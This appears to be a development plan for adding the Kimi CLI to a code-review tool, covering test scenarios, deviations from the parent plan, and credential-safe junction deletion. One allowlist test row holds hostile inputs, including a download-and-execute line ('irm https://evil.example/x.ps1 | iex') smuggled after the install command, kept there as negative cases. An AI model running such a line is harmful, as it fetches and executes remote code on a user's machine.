| S5.9 `officialSourcesAdmitOnlyMoonshotsPath_AndTheThreeWingetIds` (judge's edit) | `irm https://code.kimi.com/kimi-code/install.ps1 \| iex` ; `…/kimi-code.evil.example/…` ; `https://code.kimi.com/other/x.ps1 \| iex` ; the install line `; irm https://evil.example/x.ps1 \| iex` ; `winget install --id sharkdp.fd -e` ; `winget install --id BurntSushi.ripgrep.MSVC -e --accept-source-agreements` ; `winget install --id Evil.Tool -e` ; `winget install --id sharkdp.fd --source https://evil.example` ; `winget install --manifest C:\x.yaml` ; `winget install --id sharkdp.fd -v 1.0` ; `winget install --id sharkdp.fd --id Git.Git` ; `npm install -g @openai/codex` (unchanged) | `fromOfficialSources` | true ; false ; false ; false ; true ; true ; false ; false ; false ; false ; false ; true | the first is false (prefix not admitted); every `winget` row false (no verb reads it) |
| S5.15 `theToolStepsSkipWhatIsThereAndStopOnFailure` (`kimiWindowsInstallRuns.test.ts`, Windows only, the Vibe harness: a temp folder with spaces on PATH, a `winget` FUNCTION standing in for the real one that logs its arguments and answers a scripted exit, `rg.exe`/`fd.exe`/`git.exe` stubs present or absent per arm) (judge's edit) | (a) all three present; (b) `rg` absent, the stand-in exits 0; (c) `fd` absent, the stand-in exits 1 | the Windows line RUN in Windows PowerShell 5.1 and pwsh 7 | (a) the stand-in never called, Moonshot's step reached; (b) called once with `install --id BurntSushi.ripgrep.MSVC -e …`, then Moonshot's step; (c) called once, the line STOPS — Moonshot's step not reached | — (no line) |
| S5.10 `theWindowsLineParsesInPowerShell` (`kimiWindowsInstall.test.ts`) | the `win32` install command | PowerShell's own parser (the Vibe test's harness) | no parse error | — (no command) |
| S5.11 `theUpdateLightReadsNpm` | `versionSourceFor('kimi', p, a)` | — | `{ kind: 'npm', package: '@moonshot-ai/kimi-code' }` | undefined |
| S5.12 `anOlderServerNeverGetsAKimiRow` | installed server one minor below `KIMI_RUNTIME_SINCE`; an enabled `kimi` row and a `codex` row | the settings mirror (`vendorsWire`) | the `kimi` row withheld, the `codex` row sent, the card's note names `KIMI_RUNTIME_SINCE`; at `KIMI_RUNTIME_SINCE` the row crosses; an unknown server version → crosses | the `kimi` row crosses |
| S5.13 `theCardShowsKimisVersionWarning` | a `providers` report for the `kimi` row with a `warning` | the model card renders | the warning sentence is on the card, in the warning tone | — (pins neutrality) |
| S5.14 the hard-coded lists (parent §3) and `helpCoverage.test.ts` | — | the suite | every list holds `kimi`; the help has the Kimi row in five languages | list mismatches |

**Done when** `npm run typecheck`, `npm run lint` and `npm test` are green, the generators' `--check` is clean, and the
live checks are recorded in `research/module_tests.md`: the Install button on Windows run once on a machine without
`kimi` (or a `testsToDelete-` `KIMI_INSTALL_DIR`, so the owner's install is never overwritten — the scripts honour it)
and once in WSL — the owner's order is that the buttons work per OS, so the WSL run is not optional here even though
D18 still refuses a Kimi REVIEW there.

## Where the parent plan and the code disagree (found while splitting, 2026-10-14)

1. **S3's parts of S4 were already built by S3.** The parent's S4 lists GitScratch's reparse-point safety, D20's sweep and
   the junction test as S4 work; all three shipped with #811 (`ea84af70`, on `main` since 2026-10-14). E4.1 builds on
   them (§0) and adds only the maker, the verification and the loss sentence.
2. **The version warning is a string, not a record.** D19 asks for "a record on the launch result built by one builder";
   S2 shipped `LaunchTurn.Warning` as a string built only by `VibeLaunch.Unmeasured` (`VibeLaunch.cs:269-273`). E4.2
   extracts one builder for both; the transport stays a string (the card and the reviewer line already carry it).
3. **"A named mutex"** (D19) does not survive an `await` (thread-affine) and is not the repository's cross-process
   primitive (`HeldFile`). E4.2 records the deviation.
4. **Ripgrep is not put in `~/.kimi-code/bin` by Moonshot's installer** (both scripts, read 2026-10-14); it is Kimi's own
   download on a run at home. The `PATH` guarantee therefore fails on a fresh install whose person never ran Kimi's
   `Grep` — E4.2 must decide the pre-launch answer.
5. **D16 "neither is on npm"** is false for Kimi today: `@moonshot-ai/kimi-code` is on npm (2.2.0) and is the same
   release line as the script's binaries. E4.5 reads versions from npm and still installs through the script.
6. **Kimi 2.2.0 is out** (measured: 2.1.1). With the owner's `auto_install = true`, the version warning will show from the
   first launch — the owner's warn-and-run rule doing its job; re-running the probe on 2.2.0 makes it measured.
7. **The shim inside a redirected environment.** D19 builds the SHIM's own request with the OS-home redirect too; a
   process whose `USERPROFILE` is `os/` cannot locate the person's `~/.kimi-code` again (`KimiAcpProfile.cs:71-76` reads
   `SpecialFolder.UserProfile`). E4.2 pins that the person's paths are resolved once in the parent and passed down; E4.4
   always passes `--executable` absolute.
8. **The `.mcp.json` exclusion** is "project-root" in D6/§21, but `SnapshotExclusions` matches a separator-free entry at
   every depth. E4.3 keeps the stricter every-depth match and says so.
9. **The cross-process gate is a `HeldFile` lock file, not a named mutex** (Fable, E4.2 decision 1): a `Mutex` cannot be
   released after an `await`; the file is `<LocalApplicationData>/coai-mcp/kimi-locks/<sha256(target)[..16]>.lock`,
   beside `EngineLease`'s folder — never under `coai-kimi/` (the D20 sweep walks it) and never in temp. Inside the row's
   timeout, as D19 states. To be recorded in the parent's D19 at promotion.
10. **D19's disposal order is done TWICE — explicitly where the home is known, and inside the one deleter everywhere**
    (Fable, E4.1 decision 2; amended by the plan round on #817, accepted 2026-10-14). No coai deleter has a step that
    follows a link, so the in-deleter verification (the target lost nothing, else `LinkTargetLostException` and stop)
    reaches every caller — the six-hour sweep, the snapshots, the tests' `TempDir` — with no new call. On top of it,
    exactly D19's order is done by E4.2's `KimiHome.Dispose` wherever the caller KNOWS it holds a Kimi home: the
    junction first by its own name, the person's folder verified by names and count, only then `GitScratch` — called by
    D20's sweep and `close_consult` (E4.2), the round's scratch (E4.4), the question row and the consultant check (S5).
    D20's "junction-first for Kimi" bullet therefore stays TRUE as written; what the parent records at promotion is
    the second belt. The maker is the P/Invoke form, not `cmd.exe` (E4.1 decision 1).
11. **Ripgrep and fd are FOUND before the launch, never guaranteed by `PATH` alone — and PROVISIONED by the buttons**
    (Fable, E4.2 decision 2; amended by the plan round on #817, accepted 2026-10-14): D19's "where Kimi's installer puts
    `rg.exe`" is false (item 4); the launch is refused before any process when `rg` or `fd` does not resolve in the
    person's `bin` or on the parent's `PATH`, with the two winget commands in the sentence; the built `PATH` still begins
    with the person's `bin`, then the folder of each tool found elsewhere; the `bin/` refusal in the home stays. Nothing
    is ever admitted into the home by hash. The owner's "the install buttons must work": E4.5's Windows Install/Update
    line installs `BurntSushi.ripgrep.MSVC` and `sharkdp.fd` (the projects' own winget packages, verified 2026-10-14)
    before Moonshot's installer, guarded and stopping on failure, and `OFFICIAL_SOURCES` admits exactly those ids (E4.5
    brief §6–§7); Linux/macOS get the written-down lines when D18 lifts.
12. **Two refusals D19 did not spell out** (Fable, E4.2 decision 6): the person's managed provider must be `type =
    "kimi"` and its slot `storage = "file"` (the measured bytes; a keyring slot has no folder to junction); a person's
    `[models."<id>"]` block that is on another provider, or that coai cannot read whole, refuses with a cure instead of
    falling silently to the pinned table. And the shim takes TWO place flags, `--home <root>` and `--persons-bin`
    (E4.2 decision 4), where D19 and E4.3's first draft said `--home` alone.

13. **E4.1 deleted links first** (coder, accepted by the Opus review 2026-10-15): `GitScratch.DeleteEvenIfReadOnly` deletes a
    folder's links before its other entries (`LinksFirst`) — S1.7's "`config.toml` STILL EXISTS" cannot hold otherwise, since
    `config.toml` sorts before `credentials`. The guarantee is **per folder**: entries sorted before the link's ANCESTORS (sibling
    `kh-*` folders, answer files in a round scratch) are already gone when the walk stops.
14. **`ConsultantHomeSweep.DeleteAllBut` deletes files last** (E4.1, accepted): the conversation's stamp
    (`coai-conversation.txt`) is a file, and deleting it before the directory that failed made a stopped folder read as another
    store's and wait out the foreign-folder age; S1.8's "the next Sweep removes it" needs the stamp to survive a stop.
15. **S1.10's verdict** (E4.1, accepted): .NET's `Directory.Delete(tree, recursive: true)` on Windows unlinks a junction by its
    own name and never enters it (the target's files keep bytes AND attribute), then THROWS `UnauthorizedAccessException`
    ("Access to the path 'credentials' is denied") and leaves the emptied parent folders. The three raw sites (`Escalations.cs`,
    `ReviewTreeRoot.cs`, `WorktreeManager.cs`) swallow it and stay as they are, pinned by S1.11 (whose scan now also catches
    `DirectoryInfo.Delete(true)` and `Directory.Delete(path, <any flag but a literal false>)`).
16. **The length check precedes the existence check in `Junctions.Refusal`** (E4.1, accepted), so a 33 000-character target gets
    the number rather than "does not exist"; and the bound is the REAL one — the two names must fit the reparse buffer's 16 KiB,
    about 4 090 characters, not the 32 000 the brief named (review M2).
17. **S1.14 uses two `TempDir`s** (E4.1, accepted): the person's folder must outlive the home's deletion to be looked at, and
    `TempDir.Dispose` removes its folder whole. Both are `testsToDelete-…` folders of the one test.
18. **The sign-in lock is TWO files, keyed by the folder's final path, and the running tree holds one of them** (Fable,
    E4.2 decisions 9–11, 13; the junction risk consultation 7de9430b and the E4.1 review, 2026-10-15). D19 says "a named
    mutex keyed by the hash of the credentials target, taken in `KimiLaunch.TakeAsync`"; what is built is the server's
    gate (`<key>.lock`, taken there) PLUS the shim's inheritable tree hold — per sign-in (`<key>.tree.lock`) and per
    home (`<root>/coai-tree.lock`), both inherited by `kimi`, so a tree orphaned by a crashed server still holds the
    sign-in until it ends — the key being `GetFinalPathNameByHandle`'s spelling of the folder rather than the path as
    given, with no fallback to the spelling; `KimiHome.Dispose` refuses to unlink while the home's own hold is held; the
    end of EVERY turn is a tree kill, so the kill-mid-refresh window is every turn's until M-K14 says whether `kimi`
    refreshes unasked; and the credentials target's ancestors may be links, refused only when the resolution leaves the
    local drives (D19's "must not itself be a link" stays for the target). The shim gains a third pinned flag, `--locks`.
    To be recorded in the parent's D19 at promotion, with deviation 9.

**What the E4.2 coder built differently from the spec as written (2026-10-15), each with its reason.** Items 19–33; none changes a
guarantee, each is a shape or a seam. Every scenario S2.1–S2.46 is a test (the exceptions are items 28 and 29).

19. **`KimiCredentialsLock.RootFor` is `public`, not `internal`.** The shim lives in another assembly (`CoaiMcp`), and so does the fake CLI
    that plays it in S2.43; neither has `InternalsVisibleTo`, and the shim must set the lock root from `--locks` for its async flow anyway.
    `Final` (the seam of the key's folder naming) stays `internal`, per async flow (`AsyncLocal`) like `GitScratch.AfterUnlink`.
20. **`HoldTree` answers a new closed union `TreeHolding` (`Taken(TreeHold)` / `Busy` / `Unusable`), not `Hold`.** `Hold` wraps ONE
    `FileStream` and has a private constructor; the tree hold is two. `TreeHold` is a class (it owns two streams and disposes them once), not
    the spec's record.
21. **`DisposeAllUnder` does steps (1)–(3) of `Dispose` only** (the per-home probe, the junction unlinked by name, the person's folder
    verified) on the folder itself and on each `kh-*` child, and leaves the rest of each folder to the caller's deleter. As written ("`Dispose` on
    the folder itself, then on every direct child") the first call would delete the whole folder, so S2.40's "`vh-*` and `tree/` left for the
    caller's deleter" and the children it was about to visit could not both hold. `Dispose` is steps (1)–(3) plus the deleter.
22. **`Dispose`'s verification reuses `GitScratch.Look` and a now-`internal` `GitScratch.StillMissing`** (the 200 ms settle re-list included)
    instead of a second reader; the spec's "a count below `before`'s" is subsumed by the names (a lower count with every name present cannot
    happen), and an unlistable target is unverified, as in E4.1.
23. **(Superseded by 33: the UNC row now runs through `TakeAsync`.) S2.25's UNC row was not driven through `TakeAsync`.** Reading a UNC person's `config.toml` would connect out (NTLM) in the test; the UNC
    refusal is `Junctions`' (S1.3). Two rows replace it that the spec lists elsewhere: a credentials folder that is itself a link, and an absent one.
24. **The built environment is its own unit, `KimiEnvironment`; `KimiLaunch` is one plain class.** The first draft split `KimiLaunch` into two
    `partial` files, which `.agents/conventions/common/coding-style.md` forbids (split by extracting a named unit, never a `partial`) — REJECTED by
    the review and redone. `KimiEnvironment` holds `Built` (both overloads), `BuiltPath`, `Refusal` (the plan's `EnvironmentRefusal`), `FlagOf`, `PathOf` and
    the variable and flag constants; `KimiLaunch` keeps the host, model and version checks, `ModelOf`, `VersionWarning` and `TakeAsync`. E4.3 and E4.4
    call `KimiEnvironment`. `KimiModels.RefusalFor(model, curated)` is the one sentence builder both `ModelRefusal` and the table's "no pinned entry"
    arm call.
25. **`KimiLaunch.Built` has a pure overload taking the parent `PATH`** (`Built(request, places, parentPath)`); the two-argument form is the
    brief's (the request's own `PATH`, else this process's). That fallback is the one environment read in `KimiLaunch` and it contradicts review
    focus (1) ("the only environment read is `KimiPlaces.Resolve`'s injected `env`") — the brief and the focus disagree; the brief's behaviour is kept,
    it reads a `PATH` to KEEP and never a location to find, and E4.4 can pass the parent's `PATH` explicitly through the overload.
26. **`ExecutableResolver.In(directory, candidates, isWindows, exists)` is `internal`** (brief §3's "extract it if it is extractable");
    `KimiTools` calls it with its own candidates (the name, then each `PATHEXT` suffix, then the platform defaults when `PATHEXT` is empty).
    `KimiTools` also owns the two winget command strings (`RipgrepInstall`, `FdInstall`), which the home's `bin/` sentence quotes too.
27. **`KimiModelBlocks.Parse` also refuses a table with a duplicate id or an id outside `kimi-code/`** — a table that could not be one-to-one with
    `Curated` is broken, not merely odd. **`KimiModelBlocks.For`** reads the person's block through `CodexConfigFile.TableValue`, so a malformed
    line elsewhere in the file is never parsed and never quoted (decision 12).
28. **S2.43's grandchild is the fake CLI's `sleep 30000` verb**, started by the `tree-hold` child (`tests_fakecli/TreeHoldVerb.cs`), so no
    `FAKECLI_*` variable is needed on the grandchild. The first draft's single probe right after the kill read `Held` for a reason that proved
    nothing (handle rundown lags a process exit); the test now asserts `Held` at every probe for 1.5 s. S2.27's two-launch ordering is tested
    twice: at the lock (`KimiCredentialsLockTests`) and through the control (`KimiLaunchControlTests`).
29. **S2.45's shim turn runs `AskAcpMode.RunAsync` with `--locks` and `--home` flags the shim does not yet read** (E4.3 wires them), so the turn
    exercises the report and the boundary but takes no tree hold; the lock names, the per-home file name and the rendered config are collected
    directly. The fake ACP agent gained an `"echo": true` read option (the reply said back as its own message) so the control arm can show a
    served canary reaching the answer.
30. **`Junctions.Refusal` and `Make` gain the `final` seam as extra overloads**, as brief §17 says; `Resolved` is asked after `Chained` and before
    `Taken`, and the existing `Refusal(host, link, target, driveType)` internal overload now delegates.
31. **`KimiHome.Made` returns the sentence for a root, `home/` or `os/` that is a link before creating anything**, and a fresh home's
    junction refusal is prefixed `the Kimi sign-in could not be linked: `. The `KimiHome.Prefix` is `kh-` and `HomeFor` calls `VibeRuntime.Short`
    (made `internal`), one hash rule and two prefixes. Nothing renames `VibeHomeTurns` (proposed, not done: it is keyed by any owned root and a
    rename touches the sweep and `ConsultantPlaces` for a name alone — `OwnedHomeTurns` would be the name).
32. **S2.14 does not set this process's `USERPROFILE`.** The spec asks for `Environment.SetEnvironmentVariable("USERPROFILE", …)` for the test's
    duration; `[Collection]` only serialises tests inside one collection, so the redirected value would be visible to every parallel test that
    reads the profile — the first whole-suite run failed two process-spawning scenarios (`QuestionRowOnAgyScenarioTests`, `AskHumanScenarioTests`;
    each green alone) with that test in the suite, one with `SQLite Error 14: unable to open database file` (a data directory derived from the
    profile; the other, `fake-cli: unknown verb`, is the known process-global `FAKECLI_MODE` hazard, so the link to this test is suspected, not
    proved). `ForShim_ReadsNoEnvironment` now proves the shape: `ForShim` has no environment parameter and every value is one of its two arguments
    or empty. A real proof of "reads no environment" belongs in a child process (E4.3's shim test, which runs the real shim with a redirected
    `USERPROFILE`).

33. **The review of E4.2 (2026-10-15) — fixes.** B1: no test holds an inheritable handle: `KimiCredentialsLockTests` took `HoldTree` three times in the
    test host (two of them returning before any open, one `Taken`); all three are gone — the `Unusable` and `Busy` arms run in a second `FakeCli.exe
    tree-hold` child and the re-take uses the non-inheriting `HeldFile` calls — and `NoTestHoldsAnInheritableHandleTests` scans `src_mcp/tests` for
    `HoldTree(`, `inheritable: true` and `FileShare.Inheritable` (the fake CLI project is exempt). M1: `HoldTree`'s per-home take waits 500 ms
    (`HeldFile.TakeWithin`), because a disposal's `HomeProbe` opens that file exclusively for an instant; a seam (`BeforeTheHomeHold`) lets the child
    meet a probe deterministically. M2: `KimiHome.Dispose` answers `Stopped` and `DisposeAllUnder` SKIPS a root, `kh-*` child or `home/` that is
    itself a link — silently, not through `warn`, because a warned skip would make the D20 sweep keep the folder for ever; the shared deleter
    (E4.1) removes such a link by its own name. M3: `KimiLaunch` refuses a person's home that is not on a local drive by its SPELLING
    (`Junctions.IsLocal`) before any read, so a UNC home is never connected to, and S2.25's UNC row now runs through `TakeAsync` (it replaces
    deviation 23's omission). M4: the version probe is built from the launch request's own PATH (`KimiEnvironment.PathOf`), so one PATH source
    feeds both. M5: S2.45's malformed rows assert the refusal names the KEY (`capabilities`) and the cure and never the line.

**Stated limit of E4.1's deleter (risk consultation 7de9430b, 2026-10-15).** The deleter's link checks are path checks at one
moment: a directory swapped for a junction between `IsLink(dir)` and the enumeration that follows can still be entered. Closing
that needs handle-based deletion (`FILE_FLAG_OPEN_REPARSE_POINT`), which is out of this story; a same-user process able to swap
folders in coai's scratch could equally touch the credentials directly. Also from the review: the deleter READS a link's target
only when `Junctions.IsLocal` says it is on a local drive (no share, device path, relative name or mapped network drive — reading
one connects out or waits out the SMB timeout), re-lists once after 200 ms before reporting a loss (a Kimi refresh rotates by
temp file and rename), and ignores a link's own name when it points at its parent.

## Definition of Done (this epic)

- [x] E4.1 and E4.2 have SCENARIOS and BRIEF written by Fable before their coders start (2026-10-14); the ledger line in
      the parent reads `Cornerstones: 2 of 2`.
- [ ] Deviations 9–12 and 18 of §"Where the parent plan and the code disagree" are written into the parent's D19 / D20 and
      its §4 S4 block when E4.1 and E4.2 land, and again at promotion.
- [ ] Every scenario of E4.3–E4.5 (and Fable's for E4.1–E4.2) is a test that was watched red with the expected message,
      then green; both suites green; `dotnet format --verify-no-changes` clean; generators current.
- [ ] No test made a junction outside its own `testsToDelete-` folder; every test leftover is named `testsToDelete-…`.
- [ ] A Kimi row added from the preset reviews one plan round and one code round live through the product on Windows
      (the parent's DoD), with the version warning shown on the card when the installed Kimi is not 2.1.1.
- [ ] The parent plan's S4 block records the deviations above as they land, and this document and the parent promote
      together (planning-docs.md, *A plan split into epics and stories*).
